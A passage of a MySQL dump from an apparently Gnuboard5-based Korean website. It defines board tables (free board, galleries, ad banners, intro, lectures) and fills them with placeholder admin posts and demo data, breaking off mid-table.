/*!40000 ALTER TABLE `g5_write_faq` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_write_faq` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_free`
--

DROP TABLE IF EXISTS `g5_write_free`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_free` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`),
  KEY `wr_datetime` (`wr_datetime`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_free`
--

LOCK TABLES `g5_write_free` WRITE;
/*!40000 ALTER TABLE `g5_write_free` DISABLE KEYS */;
INSERT INTO `g5_write_free` VALUES (1,-1,'',1,0,0,'','','','자유 게시판입니다','자유 게시판입니다.','','',0,0,'',2,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-25 03:07:30',0,'2013-05-25 03:07:30','127.0.0.1','','','','','','','','','','','','',''),(2,-2,'',2,0,0,'','','','자유 게시판입니다','자유 게시판입니다.','','',0,0,'',8,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-28 22:54:15',0,'2013-05-28 22:54:15','127.0.0.1','','','','','','','','','','','','',''),(3,-3,'',3,0,0,'','','','자유 게시판입니다','자유 게시판입니다.','','',0,0,'',21,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-28 22:54:33',0,'2013-05-28 22:54:33','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_free` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_gallery0`
--

DROP TABLE IF EXISTS `g5_write_gallery0`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_gallery0` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_gallery0`
--

LOCK TABLES `g5_write_gallery0` WRITE;
/*!40000 ALTER TABLE `g5_write_gallery0` DISABLE KEYS */;
INSERT INTO `g5_write_gallery0` VALUES (1,-1,'',1,0,0,'','','html1','상단 헤더 이미지','상단 헤더 이미지<br>','','',0,0,'',8,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@domain.com','','2013-05-25 01:25:33',1,'2013-05-25 01:25:33','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_gallery0` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_gallery1`
--

DROP TABLE IF EXISTS `g5_write_gallery1`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_gallery1` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_gallery1`
--

LOCK TABLES `g5_write_gallery1` WRITE;
/*!40000 ALTER TABLE `g5_write_gallery1` DISABLE KEYS */;
INSERT INTO `g5_write_gallery1` VALUES (1,-1,'',1,0,0,'','','','갤러리 이미지','갤러리 이미지','','',0,0,'',10,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-25 19:34:06',1,'2013-05-25 19:34:06','127.0.0.1','','','','','','','','','','','','',''),(2,-2,'',2,0,0,'','','','갤러리 이미지','갤러리 이미지','','',0,0,'',8,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-25 19:35:25',1,'2013-05-25 19:35:25','127.0.0.1','','','','','','','','','','','','',''),(3,-3,'',3,0,0,'','','','갤러리 이미지','이미지와 관련된 설명을 여기에 적어 넣으십시요.\r\n이미지와 관련된 설명을 여기에 적어 넣으십시요.','','',0,0,'',17,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@domain.com','','2013-05-25 19:35:47',1,'2013-05-25 19:35:47','127.0.0.1','','','','','','','','','','','','',''),(4,-4,'',4,0,0,'','','','갤러리 이미지','이미지와 관련된 설명을 여기에 적어 넣으십시요.\r\n이미지와 관련된 설명을 여기에 적어 넣으십시요.','','',0,0,'',6,0,0,'admin','4d9436990dd66a11','최고관리자','admin@domain.com','','2013-09-08 01:24:30',1,'2013-09-08 01:24:30','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_gallery1` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_gallery2`
--

DROP TABLE IF EXISTS `g5_write_gallery2`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_gallery2` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_gallery2`
--

LOCK TABLES `g5_write_gallery2` WRITE;
/*!40000 ALTER TABLE `g5_write_gallery2` DISABLE KEYS */;
INSERT INTO `g5_write_gallery2` VALUES (1,-1,'',1,0,0,'','여행','','테스트1','정해진 문자 갯수를 초과하지 않는 경우의 예입니다. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 정해진 문자 갯수를 초과하지 않는 경우의 예입니다. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요.','','',0,0,'',8,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-25 19:36:37',1,'2013-05-25 19:36:37','127.0.0.1','','','','','','','','','','','','',''),(2,-2,'',2,0,0,'','취미','html1','테스트2','정해진 문자 갯수를 초과하는 경우의 예입니다. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 정해진 문자 갯수를 초과하는 경우의 예입니다. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요.','','',0,0,'',15,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-25 19:37:49',1,'2013-05-25 19:37:49','127.0.0.1','','','','','','','','','','','','',''),(4,-3,'',4,0,0,'','유머','html1','테스트3','정해진 문자 갯수를 초과하는 경우의 예입니다. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어\r\n 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 정해진 문자 갯수를\r\n 초과하는 경우의 예입니다. 이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요. \r\n이미지와 관련된 설명을 여기에 적어 넣으십시요. 이미지와 관련된 설명을 여기에 적어 넣으십시요.','','',0,0,'',3,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@domain.com','','2013-08-06 00:02:51',1,'2013-08-06 00:02:51','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_gallery2` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_gallery_ad`
--

DROP TABLE IF EXISTS `g5_write_gallery_ad`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_gallery_ad` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_gallery_ad`
--

LOCK TABLES `g5_write_gallery_ad` WRITE;
/*!40000 ALTER TABLE `g5_write_gallery_ad` DISABLE KEYS */;
INSERT INTO `g5_write_gallery_ad` VALUES (1,-1,'',6,0,0,'','','','배너 샘플','http://www.goodbuilder.co.kr','','',0,0,'',4,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2012-11-09 00:12:04',1,'2012-11-09 00:12:04','127.0.0.1','','','','','','','','','','','','',''),(2,-2,'',7,0,0,'','','','배너 샘플','http://www.goodbuilder.co.kr','','',0,0,'',7,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2012-11-09 00:41:52',1,'2012-11-09 00:41:52','127.0.0.1','','','','','','','','','','','','',''),(3,-3,'',3,0,0,'','','','배너 샘플','http://www.goodbuilder.co.kr','','',0,0,'',5,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@localhost.localdomain','','2013-05-29 03:33:40',1,'2013-05-29 03:33:40','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_gallery_ad` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_gallery_main_ad`
--

DROP TABLE IF EXISTS `g5_write_gallery_main_ad`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_gallery_main_ad` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_gallery_main_ad`
--

LOCK TABLES `g5_write_gallery_main_ad` WRITE;
/*!40000 ALTER TABLE `g5_write_gallery_main_ad` DISABLE KEYS */;
INSERT INTO `g5_write_gallery_main_ad` VALUES (1,-1,'',1,0,0,'','','','메인 광고1','메인 광고1','','',0,0,'',16,0,0,'admin','074b36bc18ae7bb3','최고관리자','admin@domain.com','','2013-01-10 01:51:54',1,'2013-01-10 01:51:54','127.0.0.1','','','','','','','','','','','','',''),(2,-2,'',2,0,0,'','','','메인광고2','메인광고2','','',0,0,'',1,0,0,'admin','0de7798c79b83bc7','최고관리자','admin@domain.com','','2014-12-16 01:38:50',1,'2014-12-16 01:38:50','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_gallery_main_ad` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_intro`
--

DROP TABLE IF EXISTS `g5_write_intro`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_intro` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_trackback` varchar(255) NOT NULL,
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(255) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL DEFAULT '',
  `wr_twitter_user` varchar(255) NOT NULL DEFAULT '',
  `wr_me2day_user` varchar(255) NOT NULL DEFAULT '',
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
  KEY `wr_num_reply_parent` (`wr_num`,`wr_reply`,`wr_parent`),
  KEY `wr_is_comment` (`wr_is_comment`,`wr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_write_intro`
--

LOCK TABLES `g5_write_intro` WRITE;
/*!40000 ALTER TABLE `g5_write_intro` DISABLE KEYS */;
INSERT INTO `g5_write_intro` VALUES (1,-1,'',1,0,0,'','','html1','인사말','<p>\r\n						저희 사이트를 방문해 주셔서 감사합니다.</p>','','',0,0,'',47,0,0,'admin','12d0346b4847233f','최고관리자','admin@domain','','2011-04-08 21:07:01',0,'2011-04-08 21:07:01','127.0.0.1','','','','','','','','','','','','',''),(2,-2,'',2,0,0,'','','html1','연혁','<h3>2014년</h3>\r\n					<p>\r\n					사이트 운영\r\n					</p>\r\n					<h3>2013년</h3>\r\n					<p>\r\n					사이트 오픈\r\n					</p>','','',0,0,'',55,0,0,'admin','12d0346b4847233f','최고관리자','admin@domain','','2011-04-08 21:07:25',0,'2011-04-08 21:07:25','127.0.0.1','','','','','','','','','','','','',''),(3,-3,'',3,0,0,'','','html1','약력','<h3>2014년~현재</h3>\r\n					<p>약력2</p>\r\n					<h3>2013년</h3>\r\n					<p>약력1</p>','','',0,0,'',3,0,0,'admin','4d9436990dd66a11','최고관리자','admin@domain','','2014-05-06 21:49:39',0,'2014-05-06 21:49:39','127.0.0.1','','','','','','','','','','','','',''),(4,-4,'',4,0,0,'','','html1','오시는 길','약도','','',0,0,'',2,0,0,'admin','4d9436990dd66a11','최고관리자','admin@domain','','2014-05-06 21:51:38',0,'2014-05-06 21:51:38','127.0.0.1','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_write_intro` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_write_lecture_real`
--

DROP TABLE IF EXISTS `g5_write_lecture_real`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_write_lecture_real` (
  `wr_id` int(11) NOT NULL AUTO_INCREMENT,
  `wr_num` int(11) NOT NULL DEFAULT '0',
  `wr_reply` varchar(10) NOT NULL,
  `wr_parent` int(11) NOT NULL DEFAULT '0',
  `wr_is_comment` tinyint(4) NOT NULL DEFAULT '0',
  `wr_comment` int(11) NOT NULL DEFAULT '0',
  `wr_comment_reply` varchar(5) NOT NULL,
  `ca_name` varchar(255) NOT NULL,
  `wr_option` set('html1','html2','secret','mail') NOT NULL,
  `wr_subject` varchar(255) NOT NULL,
  `wr_content` text NOT NULL,
  `wr_link1` text NOT NULL,
  `wr_link2` text NOT NULL,
  `wr_link1_hit` int(11) NOT NULL DEFAULT '0',
  `wr_link2_hit` int(11) NOT NULL DEFAULT '0',
  `wr_hit` int(11) NOT NULL DEFAULT '0',
  `wr_good` int(11) NOT NULL DEFAULT '0',
  `wr_nogood` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL,
  `wr_password` varchar(255) NOT NULL,
  `wr_name` varchar(255) NOT NULL,
  `wr_email` varchar(255) NOT NULL,
  `wr_homepage` varchar(255) NOT NULL,
  `wr_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `wr_file` tinyint(4) NOT NULL DEFAULT '0',
  `wr_last` varchar(19) NOT NULL,
  `wr_ip` varchar(255) NOT NULL,
  `wr_facebook_user` varchar(255) NOT NULL,
  `wr_twitter_user` varchar(255) NOT NULL,
  `wr_1` varchar(255) NOT NULL,
  `wr_2` varchar(255) NOT NULL,
  `wr_3` varchar(255) NOT NULL,
  `wr_4` varchar(255) NOT NULL,
  `wr_5` varchar(255) NOT NULL,
  `wr_6` varchar(255) NOT NULL,
  `wr_7` varchar(255) NOT NULL,
  `wr_8` varchar(255) NOT NULL,
  `wr_9` varchar(255) NOT NULL,
  `wr_10` varchar(255) NOT NULL,
  PRIMARY KEY (`wr_id`),
